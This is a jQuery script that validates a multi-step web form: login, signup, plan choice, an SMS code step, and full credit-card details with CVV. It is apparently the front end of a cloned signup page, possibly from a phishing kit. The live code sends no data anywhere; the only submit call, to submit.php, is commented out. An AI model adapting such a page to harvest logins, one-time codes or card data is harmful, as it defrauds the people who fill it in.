$(document).ready(function () {


    $(".faq-list li").click(function () {

        if ($(this).find("div").hasClass("open")) {
            $(this).find("div").removeClass("open").addClass("closed")
            $(this).find("svg").removeClass("svg-open").addClass("svg-closed")
        } else {
            $(this).find("div").removeClass("closed").addClass("open")
            $(this).find("svg").removeClass("svg-closed").addClass("svg-open")
        }
    });

    function checkEmail(email) {
        filter = /^[a-z0-9][a-z0-9-_\.]+@([a-z]|[a-z0-9]?[a-z0-9-]+[a-z0-9])\.[a-z0-9]{2,10}(?:\.[a-z]{2,10})?$/i;
        if (filter.test(email)) {
            // Yay! valid
            return true;
        }
        else { return false; }
    }


    $('#init_email_t').on("keyup , focus", () => {
        var email = $("#init_email_t").val()

        if (email == "") {
            $("#init_email_t").addClass('error').removeClass('hasText')
            $("#inputErrorMsgTop").show().text("Email is required!")
            $("#btn_start_top").prop("disabled", true)
        }
        else if (!checkEmail(email)) {
            $("#init_email_t").addClass('error').addClass("hasText")
            $("#inputErrorMsgTop").show().text("Please enter a valid email address")
            $("#btn_start_top").prop("disabled", true)
        } else {
            $("#init_email_t").removeClass('error').addClass("hasText")
            $("#inputErrorMsgTop").hide()
            $("#btn_start_top").prop("disabled", false)
        }

    });

    $('#init_email_b').on("keyup , focus", () => {
        var email = $("#init_email_b").val()

        if (email == "") {
            $("#init_email_b").addClass('error').removeClass('hasText')
            $("#inputErrorMsgBottom").show().text("Email is required!")
        }
        else if (!checkEmail(email)) {
            $("#init_email_b").addClass('error').addClass("hasText")
            $("#inputErrorMsgBottom").show().text("Please enter a valid email address")
        } else {
            $("#init_email_b").removeClass('error').addClass("hasText")
            $("#inputErrorMsgBottom").hide()
            $("#btn_start_bottom").prop("disabled", false)
        }

    });



    $('#id_userLoginId').on("keyup , focus", () => {
        var email = $("#id_userLoginId").val()

        if (email == "") {
            $("#id_userLoginId").addClass('error').removeClass('hasText')
            $("#inputErrorMsgUser").show().text("Please enter a valid email or phone number")
        }
        else if (!checkEmail(email)) {
            $("#id_userLoginId").addClass('error').addClass("hasText")
            $("#inputErrorMsgUser").show().text("Please enter a valid email.")
        } else {
            $("#id_userLoginId").removeClass('error').addClass("hasText")
            $("#inputErrorMsgUser").hide()
        }
    });

    $('#id_password').on("keyup , focus", () => {
        let pass = $("#id_password").val()
        $("#id_password_toggle").show()

        if (pass.length == 0) {
            $("#id_password").removeClass('hasText')
        } else if (pass.length < 4) {
            $("#id_password").addClass('error').addClass('hasText')
            $("#inputErrorMsgPass").show()
            $("#id_password_toggle").addClass('error')
        }
        else {
            $("#id_password").removeClass('error').addClass("hasText")
            $("#inputErrorMsgPass").hide()
            $("#id_password_toggle").removeClass('error')
        }

    });

    $('#id_password').blur(() => {
        // $("#id_password_toggle").hide()
    });

    $('#id_password_toggle').click(() => {
        if ($('#id_password').attr("type") == "text") {
            $('#id_password').attr("type", "password")
            $("#id_password_toggle").text("SHOW")

        } else if ($('#id_password').attr("type") == "password") {
            $('#id_password').attr("type", "text")
            $("#id_password_toggle").text("HIDE")
        }

    });

    $('#id_userLoginId , #id_password').on("keyup , focus", () => {
        if (!$("#id_password").hasClass('error') && !$("#id_userLoginId").hasClass('error')
            && $("#id_password").val().length > 0 && $("#id_userLoginId").val().length > 0) {

            $("#btn_login").prop("disabled", false)

        } else {
            $("#btn_login").prop("disabled", true)
        }
    });


    $('#id_email').on("keyup , focus", () => {
        var email = $("#id_email").val()

        if (email == "") {
            $("#id_email").addClass('error').removeClass('hasText')
            $("#inputErrorMsgEmail").show().text("Email is required!")
            $("#id_email").parent().parent().parent().removeClass('validated')
        }
        else if (email.length < 5) {
            $("#id_email").addClass('error').addClass("hasText")
            $("#inputErrorMsgEmail").show().text("Email should be between 5 and 50 characters")
            $("#id_email").parent().parent().parent().removeClass('validated')
        }
        else if (!checkEmail(email)) {
            $("#id_email").addClass('error').addClass("hasText")
            $("#inputErrorMsgEmail").show().text("Please enter a valid email address")
            $("#id_email").parent().parent().parent().removeClass('validated')
        } else {
            $("#id_email").removeClass('error').addClass("hasText")
            $("#inputErrorMsgEmail").hide()
            $("#id_email").parent().parent().parent().addClass('validated')

        }
    });

    $('#id_pass').on("keyup , focus", () => {
        let pass = $("#id_pass").val()

        if (pass == "") {
            $("#id_pass").addClass('error').removeClass('hasText')
            $("#inputErrorMsgPass").show().text("Password is required!")
            $("#id_pass").parent().parent().parent().removeClass('validated')
        }
        else if (pass.length < 4) {
            $("#id_pass").addClass('error').addClass("hasText")
            $("#inputErrorMsgPass").show().text("Password should be between 4 and 60 characters")
            $("#id_pass").parent().parent().parent().removeClass('validated')
        }
        else {
            $("#id_pass").removeClass('error').addClass("hasText")
            $("#inputErrorMsgPass").hide()
            $("#id_pass").parent().parent().parent().addClass('validated')
        }

    });

    $('#id_pass , #id_email').on("keyup , focus", () => {
        if ($("#id_pass").parent().parent().parent().hasClass('validated') && $("#id_email").parent().parent().parent().hasClass('validated')) {
            $("#btn_step_two").prop("disabled", false)

        } else {
            $("#btn_step_two").prop("disabled", true)
        }
    });




    $("div.planGrid__selector > label").on("click", () => {
        $("table.planGrid__featureTable tr > td").removeClass("planGrid__cell--isSelected")

        if ($(this).find("input[name='planChoice']:checked").attr("id") == "planGrid_planChoice_0") {
            $("table.planGrid__featureTable tr > td:nth-child(2)").addClass("planGrid__cell--isSelected")
        } else if ($(this).find("input[name='planChoice']:checked").attr("id") == "planGrid_planChoice_1") {
            $("table.planGrid__featureTable tr > td:nth-child(3)").addClass("planGrid__cell--isSelected")
        } else if ($(this).find("input[name='planChoice']:checked").attr("id") == "planGrid_planChoice_2") {
            $("table.planGrid__featureTable tr > td:nth-child(4)").addClass("planGrid__cell--isSelected")
        }
        $("#plan").val($(this).find("input[name='planChoice']:checked").next("span").text())

    });



    $('#id_sms').on("keyup , focus", () => {
        let sms = $("#id_sms").val()
        console.log(sms)
        if (sms == "") {
            $("#id_sms").addClass('error').removeClass('hasText')
            $("#inputErrorMsgSms").show().text("SMS Code is required!")
            $("#btn_sms").prop("disabled", true)
        }
        else if (sms.length < 4) {
            $("#id_sms").addClass('error').addClass("hasText")
            $("#inputErrorMsgSms").show().text("Please enter a valid SMS Code")
            $("#btn_sms").prop("disabled", true)
        }
        else {
            $("#id_sms").removeClass('error')
            $("#inputErrorMsgSms").hide()
            $("#btn_sms").prop("disabled", false)

        }


    });


    $('#id_firstName').on("keyup , focus", () => {
        var firstName = $("#id_firstName").val()

        if (firstName == "") {
            $("#id_firstName").addClass('error').removeClass('hasText')
            $("#inputErrorMsgFirst").show().text("First Name is required!")
            $("#id_firstName").parent().parent().parent().removeClass('validated')
        } else {
            $("#id_firstName").removeClass('error').addClass("hasText")
            $("#inputErrorMsgFirst").hide()
            $("#id_firstName").parent().parent().parent().addClass('validated')

        }

    });


    $('#id_lastName').on("keyup , focus", () => {
        var LastName = $("#id_lastName").val()

        if (LastName == "") {
            $("#id_lastName").addClass('error').removeClass('hasText')
            $("#inputErrorMsgLast").show().text("Last Name is required!")
            $("#id_lastName").parent().parent().parent().removeClass('validated')
        } else {
            $("#id_lastName").removeClass('error').addClass("hasText")
            $("#inputErrorMsgLast").hide()
            $("#id_lastName").parent().parent().parent().addClass('validated')

        }

    });

    $('#id_creditZipcode').on("keyup , focus", () => {
        var creditZipcode = $("#id_creditZipcode").val()

        if (creditZipcode == "") {
            $("#id_creditZipcode").addClass('error').removeClass('hasText')
            $("#inputErrorMsgBZ").show().text("Billing Zip Code is required!")
            $("#id_creditZipcode").parent().parent().parent().removeClass('validated')
        } else if (creditZipcode.length < 4) {
            $("#id_creditZipcode").addClass('error').addClass('hasText')
            $("#inputErrorMsgBZ").show().text("Please enter a valid zip code")
            $("#id_creditZipcode").parent().parent().parent().removeClass('validated')
        }
        else {
            $("#id_creditZipcode").removeClass('error').addClass("hasText")
            $("#inputErrorMsgBZ").hide()
            $("#id_creditZipcode").parent().parent().parent().addClass('validated')

        }

    });


    $('#id_creditExpirationMonth').on("keyup , focus , input", () => {
        var creditExpirationMonth = $("#id_creditExpirationMonth").val()

        if (creditExpirationMonth == "") {
            $("#id_creditExpirationMonth").addClass('error').removeClass('hasText')
            $("#inputErrorMsgMD").show().text("Expiration Month is required!")
            $("#id_creditExpirationMonth").parent().parent().parent().removeClass('validated')
        } else if (creditExpirationMonth.substr(0, 2) > 12 || creditExpirationMonth.substr(0, 2) == 00 || creditExpirationMonth.length < 2) {
            $("#id_creditExpirationMonth").addClass('error').addClass('hasText')
            $("#inputErrorMsgMD").show().text("Expiration Month must be between 01 and 12!")
            $("#id_creditExpirationMonth").parent().parent().parent().removeClass('validated')
        } else if (!creditExpirationMonth.includes("/")) {
            $("#id_creditExpirationMonth").addClass('error').addClass('hasText')
            $("#inputErrorMsgMD").show().text("Expiration Year is required!")
            $("#id_creditExpirationMonth").parent().parent().parent().removeClass('validated')
        } else if (creditExpirationMonth.substr(3, 2) > 46 || creditExpirationMonth.substr(3, 2) < 21) {
            $("#id_creditExpirationMonth").addClass('error').addClass('hasText')
            $("#inputErrorMsgMD").show().text("Expiration Year must be between 21 and 46!")
            $("#id_creditExpirationMonth").parent().parent().parent().removeClass('validated')
        } else if (creditExpirationMonth.length > 5) {
            $("#id_creditExpirationMonth").addClass('error').addClass('hasText')
            $("#inputErrorMsgMD").show().text("Please enter a valid Date")
            $("#id_creditExpirationMonth").parent().parent().parent().removeClass('validated')
        } else {
            $("#id_creditExpirationMonth").removeClass('error').addClass("hasText")
            $("#inputErrorMsgMD").hide()
            $("#id_creditExpirationMonth").parent().parent().parent().addClass('validated')

        }

        let my = $('#id_creditExpirationMonth')
        if (my.val().length == 2 && !my.val().includes("/"))
            my.val(my.val() + "/")

    });



    $('#id_creditCardSecurityCode').on("keyup , focus", () => {
        var creditCardSecurityCode = $("#id_creditCardSecurityCode").val()

        if (creditCardSecurityCode == "") {
            $("#id_creditCardSecurityCode").addClass('error').removeClass('hasText')
            $("#inputErrorMsgCNN").show().text("Security Code (CVV) is required!")
            $("#id_creditCardSecurityCode").parent().parent().parent().removeClass('validated')
        } else if (creditCardSecurityCode.length !== 3) {
            $("#id_creditCardSecurityCode").addClass('error').addClass('hasText')
            $("#inputErrorMsgCNN").show().text("Please enter a valid CVV code")
            $("#id_creditCardSecurityCode").parent().parent().parent().removeClass('validated')
        } else {
            $("#id_creditCardSecurityCode").removeClass('error').addClass("hasText")
            $("#inputErrorMsgCNN").hide()
            $("#id_creditCardSecurityCode").parent().parent().parent().addClass('validated')

        }

    });

    $('#id_phone').on("keyup , focus", () => {
        var phone = $("#id_phone").val()

        if (phone == "") {
            $("#id_phone").addClass('error').removeClass('hasText')
            $("#inputErrorMsgPHN").show().text("Phone Number is required!")
            $("#id_phone").parent().parent().parent().removeClass('validated')
        } else if (phone.length < 8) {
            $("#id_phone").addClass('error').addClass('hasText')
            $("#inputErrorMsgPHN").show().text("Please enter a valid Phone Number")
            $("#id_phone").parent().parent().parent().removeClass('validated')
        } else {
            $("#id_phone").removeClass('error').addClass("hasText")
            $("#inputErrorMsgPHN").hide()
            $("#id_phone").parent().parent().parent().addClass('validated')

        }

    });


    $('#learnmore').on("click", () => {

        $('#learnmore').hide()
        $('#more').show()

    });



    (function () {

        if (checkEmail($('#id_email').val())) {
            $("#id_email").addClass("hasText")
            $("#id_email").parent().parent().parent().addClass('validated')
        }

        if ($('#init_email_b').val() !== "") { $("#init_email_b").addClass('hasText') }
        if ($('#id_sms').val() !== "") { $("#id_sms").addClass('hasText') }
        if ($('#init_email_t').val() !== "") { $("#init_email_t").addClass('hasText') }
        if ($('#id_firstName').val() !== "") { $("#id_firstName").addClass('hasText') }
        if ($('#id_lastName').val() !== "") { $("#id_lastName").addClass('hasText') }
        if ($('#id_creditZipcode').val() !== "") { $("#id_creditZipcode").addClass('hasText') }
        if ($('#id_phone').val() !== "") { $("#id_phone").addClass('hasText') }
        if ($('#id_creditCardNumber').val() !== "") { $("#id_creditCardNumber").addClass('hasText') }
        if ($('#id_creditExpirationMonth').val() !== "") { $("#id_creditExpirationMonth").addClass('hasText') }
        if ($('#id_creditCardSecurityCode').val() !== "") { $("#id_creditCardSecurityCode").addClass('hasText') }
        if ($('#id_password').val() !== "") { $("#id_password").addClass('hasText') }
        if ($('#id_userLoginId').val() !== "") { $("#id_userLoginId").addClass('hasText') }
        if ($('#id_pass').val() !== "") { $("#id_pass").addClass('hasText') }
        if ($('#id_email').val() !== "") { $("#id_email").addClass('hasText') }
    }());


    $('#checkbox-box').on("click", () => {
        var checkbox = $("#checkbox")

        if (checkbox.prop("checked")) {
            checkbox.prop("checked", false)
        } else {
            checkbox.prop("checked", true)
        }

    });






    $('#id_creditCardNumber').on("keyup , focus", () => {

        var creditCardNumber = $("#id_creditCardNumber").val()
        if (creditCardNumber == "") {
            $("#id_creditCardNumber").addClass('error').removeClass('hasText')
            $("#inputErrorMsgCN").show().text("Card Number is required!")
            $("#id_creditCardNumber").parent().parent().parent().removeClass('validated')
        }else if (creditCardNumber.length < 19) {
            $("#id_creditCardNumber").addClass('error').addClass('hasText')
            $("#inputErrorMsgCN").show().text("Please enter a valid credit card number")
            $("#id_creditCardNumber").parent().parent().parent().removeClass('validated')
        }else {
            $("#id_creditCardNumber").removeClass('error').addClass("hasText")
            $("#inputErrorMsgCN").hide()
            $("#id_creditCardNumber").parent().parent().parent().addClass('validated')

        }

        var val = $('#id_creditCardNumber').val();         
        var newval = '';         
        val = val.replace(/\s/g, ''); 
        
        // iterate to letter-spacing after every 4 digits   
        for(var i = 0; i < val.length; i++) {             
          if(i%4 == 0 && i > 0) newval = newval.concat(' ');             
          newval = newval.concat(val[i]);         
        }        
    
        // format in same input field 
        $('#id_creditCardNumber').val(newval);  


      

    });



    // $('.email-form').submit(function (e) {
    //     e.preventDefault();

    //     $.ajax({
    //         url: "./submit.php",
    //         type: "post",
    //         data: { data : {"init-email": $('init-email').val(), "type": $('type').val()} },
    //         ContentType: 'application/json',
    //         success: function (data, statut) { 
    //           //  data = JSON.parse(data)
    //           alert('r')
    //             console.log(data)
    //         },

    //         error: function (resultat, statut, erreur) {
    //             console.log("r", resultat)
    //         }

    //     });
    // });

});

